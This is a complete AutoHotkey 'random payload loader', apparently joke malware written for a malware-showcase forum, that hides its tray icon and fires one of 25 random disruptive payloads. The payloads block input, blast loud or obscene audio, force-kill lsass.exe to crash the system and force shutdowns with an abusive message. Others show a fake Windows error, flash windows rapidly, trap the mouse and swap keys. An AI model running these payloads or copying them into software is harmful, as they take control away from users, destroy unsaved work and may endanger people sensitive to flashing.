#NoTrayIcon
;#Persistent
DetectHiddenWindows, On
; Random payload loader
; A tiny thing to randomly trigger payloads
; I am a designer, not a programmer, you know...
; (C) 2016 OMFGThor / Goldstar, made for Danooct1 forums
start:
Random, delay, 1000, 10000
Sleep, delay
Random, selection, 0, 24
if selection = 0
{
	name := "NoPayload"
	MsgBox, 16, DAMN!, You win this time!
	ExitApp
}
Else if selection = 1 ;Aard
{
	name := "MousePush"
	Loop{
		bugcheck:
		Random, direction, 0, 7
		Random, randdelay, 3000, 13000
		Random, pushX, 32, 600
		Random, pushY, 32, 600
		Sleep, randdelay
		SoundPlay, *16
			if direction = 0
				{
					MouseMove, %pushX%, %pushY%, 2, R ;push right-bottom
				}
			Else if direction = 1
				{
					MouseMove, -%pushX%, %pushY%, 2, R ;push left-bottom
				}
			Else if direction = 2
				{
					MouseMove, %pushX%, -%pushY%, 2, R ;push right-top
				}
			Else if direction = 3
				{
					MouseMove, -%pushX%, -%pushY%, 2, R ;push left-top
				}
			Else if direction = 4
				{
					MouseMove, 0, %pushY%, 2, R ;push down
				}
			Else if direction = 5
				{
					MouseMove, 0, -%pushY%, 2, R ;push up
				}
			Else if direction = 6
				{
					MouseMove, %pushX%, 0, 2, R ;push right
				}
			Else if direction = 7
				{
					MouseMove, -%pushX%, 0, 2, R ;push left
				}
		Else
				{
					goto, bugcheck
				}
	}
}

Else if selection = 2 ;Muter
{
	name := "Mute"
	Loop{
	SoundGet, master_mute, , mute
		if master_mute = OFF
			{
				Send {Volume_Mute}
			}
	Else
		SoundSet, 0
	}
}

Else if selection = 3 ;StickyKeys
{
	name := "KeyStick"
	Loop{
		Random, dormant, 4500, 10000
		Sleep, %dormant%
		Random, active, 1500, 5000
		BlockInput, On
		Sleep, %active%
		BlockInput, Off
	}
}

Else if selection = 4 ;Louder
{
	name := "Loud"
	Loop{
		SoundGet, master_mute, , mute
			if master_mute = ON
			{
				Send {Volume_Mute}
				SoundPlay, *16
			}
		Else
			SoundSet, 100
		Sleep, 100
		}
}

Else if selection = 5 ;Ear Rape 1, Legacy
{
	name := "EarRape1"
	Loop
		{
			SoundPlay, yah.wav, 1
		}
}

Else if selection = 6 ;Ear Rape 2
{
	name := "EarRape2"
	Loop
		{
			SoundPlay, TITENIC.mp3, 1
		}
}
Else if selection = 7 ;SpamKey
{
	name := "KeySpam"
	Loop{
	Random, spamkey1, 1, 10
	loop, %spamkey1%
		{
			Send {CapsLock}
		}
	Sleep, 10
	Random, spamkey2, 1, 10
	loop, %spamkey2%
		{
			Send {NumLock}
		}
	Sleep, 10
	Random, spamkey3, 1, 10
	loop, %spamkey3%
		{
			Send {ScrollLock}
		}
	Sleep, 10
	}
}
Else if selection = 8 ;Annoy
{
	name := "Annoy"
	begin:
	Random, song, 0, 16
	Random, delay, 1000, 3000
	Sleep, delay
	if song = 0
		{
			SoundPlay, 1.wav, 1 
			goto, begin
		}
	Else if song = 1
		{
			SoundPlay, 2.mp3, 1 
			goto, begin
		}
	Else if song = 2
		{
			SoundPlay, 3.mp3, 1 
			goto, begin
		}
	Else if song = 3
		{
			SoundPlay, 4.mp3, 1
			goto, begin
		}
	Else if song = 4
		{
			SoundPlay, 5.mp3, 1
			goto, begin
		}
	Else if song = 5
		{
			SoundPlay, 6.mp3, 1
			goto, begin
		}
	Else if song = 6
		{
			SoundPlay, 7.mp3, 1
			goto, begin
		}
	Else if song = 7
		{
			SoundPlay, 8.mp3, 1
			goto, begin
		}
	Else if song = 8
		{
			SoundPlay, 9.wav, 1
			goto, begin
		}
	Else if song = 9
		{
			SoundPlay, a.wav, 1
			goto, begin
		}
	Else if song = 10
		{
			SoundPlay, b.wav, 1
			goto, begin
		}
	Else if song = 11
		{
			SoundPlay, c.wav, 1
			goto, begin
		}
	Else if song = 12
		{
			SoundPlay, d.wav, 1
			goto, begin
		}
	Else if song = 13
		{
			SoundPlay, e.wav, 1
			goto, begin
		}
	Else if song = 14
		{
			SoundPlay, f.mp3, 1
			goto, begin
		}
	Else if song = 15
		{
			SoundPlay, g.wav, 1
			goto, begin
		}
	Else if song = 16
		{
			SoundPlay, SUNNY_DAY.mp3, 1 ;SUNNY DAY
			goto, begin
		}
	Else
		{ 
			goto, start
		}

}
Else if selection = 9 ;This section might be replaced with NotMyFault, in case if it needs any more blue
{
	name := "LSASS"
			run, taskkill /IM lsass.exe /f ; Kill LSASS, which results in system reboot
			run, taskkill /IM lsass.exe /f
			run, taskkill /IM lsass.exe /f
			run, taskkill /IM lsass.exe /f
			run, taskkill /IM lsass.exe /f
			run, taskkill /IM lsass.exe /f
			run, taskkill /IM lsass.exe /f
			run, taskkill /IM lsass.exe /f
			run, taskkill /IM lsass.exe /f
			run, taskkill /IM lsass.exe /f ;Just making sure it's dead
}
Else if selection = 10
{
	name := "Message"
	MsgBox ,16 , Microsoft Windows Operating System, Remote Procedure Call has failed.`nThis action cannot be completed.
	Return
}
Else if selection = 11 ;Insanity
{
	name := "Insanity"
	begininsane:
	Random, insanity, 0, 17
	if insanity = 0
		{
			SoundPlay, a1.wav, 1 
			goto, begininsane
		}
	Else if insanity = 1
		{
			SoundPlay, a2.wav, 1 
			goto, begininsane
		}
	Else if insanity = 2
		{
			SoundPlay, a3.wav, 1 
			goto, begininsane
		}
	Else if insanity = 3
		{
			SoundPlay, a4.wav, 1
			goto, begininsane
		}
	Else if insanity = 4
		{
			SoundPlay, a5.wav, 1
			goto, begininsane
		}
	Else if insanity = 5
		{
			SoundPlay, a6.wav, 1
			goto, begininsane
		}
	Else if insanity = 6
		{
			SoundPlay, a7.wav, 1
			goto, begininsane
		}
	Else if insanity = 7
		{
			SoundPlay, a8.wav, 1
			goto, begininsane
		}
	Else if insanity = 8
		{
			SoundPlay, a9.wav, 1
			goto, begininsane
		}
	Else if insanity = 9
		{
			SoundPlay, aa.wav, 1
			goto, begininsane
		}
	Else if insanity = 10
		{
			SoundPlay, ab.wav, 1
			goto, begininsane
		}
	Else if insanity = 11
		{
			SoundPlay, ac.wav, 1
			goto, begininsane
		}
	Else if insanity = 12
		{
			SoundPlay, ad.wav, 1
			goto, begininsane
		}
	Else if insanity = 13
		{
			SoundPlay, ae.wav, 1
			goto, begininsane
		}
	Else if insanity = 14
		{
			SoundPlay, af.mp3, 1
			goto, begininsane
		}
	Else if insanity = 15
		{
			SoundPlay, ag.wav, 1
			goto, begininsane
		}
	Else if insanity = 16
		{
			SoundPlay, ah.wav, 1
			goto, begininsane
		}
	Else if insanity = 17
		{
			SoundPlay, ai.wav, 1
			goto, begininsane
		}
	Else
		{
			goto, begininsane
		}
}
Else if selection = 12 ;Nava Shield Emulator 2015 
{
	name := "NavaEmul"
	navastart:
	Random, navashit, 0, 4
	if navashit = 0
		{
			SoundPlay, alert.wav, 1 
			Goto, navastart
		}
	Else if navashit = 1
		{
			SoundPlay, clock.wav, 1 
			Goto, navastart
		}
	Else if navashit = 2
		{
			SoundPlay, ding.wav, 1 
			Goto, navastart
		}
	Else if navashit = 3
		{
			SoundPlay, laugh1.wav, 1
			Goto, navastart
		}
	Else if navashit = 4
		{
			SoundPlay, laugh2.wav, 1
			Goto, navastart
		}
	Else
		{
			goto, navastart
		}
}
Else if selection = 13 ;Flasher
{
	name := "SeizureWindows"
	SetTimer, Seizure, 50
		Seizure:
			WinGet, curtrans, Transparent, A
			if curtrans <= 255
				{
					WinSet, Transparent, %curtrans%-4, A
				}
			if curtrans <= 1
				{
					WinSet, Transparent, %curtrans%+4, A
				}
			else
				{
					WinSet, Transparent, 255, A
					WinSet, Transparent, OFF, A
				}
			Return
}
Else if selection = 14 ;Loud Music 1
{
	name := "MusicPlay1"
	SoundPlay, CUNT.mp3, 1
	goto, start
}
Else if selection = 15 ;Loud Music 2
{
	name := "MusicPlay2"
	SoundPlay, FUCKYOU.mp3, 1
	goto, start
}
Else if selection = 16 ;Loud Music 3
{
	name := "MusicPlay3"
	SoundPlay, SANSYOU.mp3, 1
	goto, start
}
Else if selection = 17 ;Shutdown
{
	name := "ShutdownMsg1"
	MsgBox, 16, Error, Better Luck Next Time!
	Shutdown, 5
	ExitApp
}
Else if selection = 18 ;Nicer Shutdown
{
	name := "ShutdownSilent"
	Shutdown
	ExitApp
}
Else if selection = 19 ;SHAKE!!!!
{
	name := "Shake"
	Loop{
		shakey:
		Random, shakedir, 0, 7
		Random, pushX, 2, 16
		Random, pushY, 2, 16
		if shakedir = 0
			{
				MouseMove, %pushX%, %pushY%, 1, R ;push right-bottom
			}
		Else if shakedir = 1
			{
				MouseMove, -%pushX%, %pushY%, 1, R ;push left-bottom
			}
		Else if shakedir = 2
			{
				MouseMove, %pushX%, -%pushY%, 1, R ;push right-top
			}
		Else if shakedir = 3
			{
				MouseMove, -%pushX%, -%pushY%, 1, R ;push left-top
			}
		Else if shakedir = 4
			{
				MouseMove, 0, %pushY%, 1, R ;push down
			}
		Else if shakedir = 5
			{
				MouseMove, 0, -%pushY%, 1, R ;push up
			}
		Else if shakedir = 6
			{
				MouseMove, %pushX%, 0, 1, R ;push right
			}
		Else if shakedir = 7
			{
				MouseMove, -%pushX%, 0, 1, R ;push left
			}
		Else
			{
				goto, shakey
			}
	}
}
Else if selection = 20 ;Mouse Entrapment
{
	name := "MouseTrap"
	SendMode Input
	CoordMode, Mouse, Screen
	SetTimer, Warden, 50 ;Mouse check delay
	Warden:
	MouseMove, (A_ScreenWidth / 2), (A_ScreenHeight / 2), 10 ; Center the mouse on the screen
	return
}
Else if selection = 21 ;Engrish
{
	name := "Engrish"
		R::L
		L::R
		r::l
		l::r
		G::H
		H::G
		g::h
		h::g
		Z::X
		X::Z
		z::x
		x::z
}
Else if selection = 22
{
	name := "ShutdownMsg2"
	Run, shutdown /s /f /c "YOU PATHETIC LEECH. YOU PARASITE. FUCK YOU AND YOUR LIFE."
	ExitApp
}
Else if selection = 23
{
	name := "ShutdownAHK_PwrDwn"
	Shutdown, 12
	ExitApp
}
Else if selection = 24
{
	name := "Minimizer"
	Loop{
			WinMinimizeAll
			WinMinimizeAllUndo
	}
}
Else
{
ExitApp
}

F12::MsgBox, 16, Debug, CurrentPayload = %selection%, PayloadName = %name%
F11::{
Reload
MsgBox, 16, Alert, The script failed to reload!
return
}
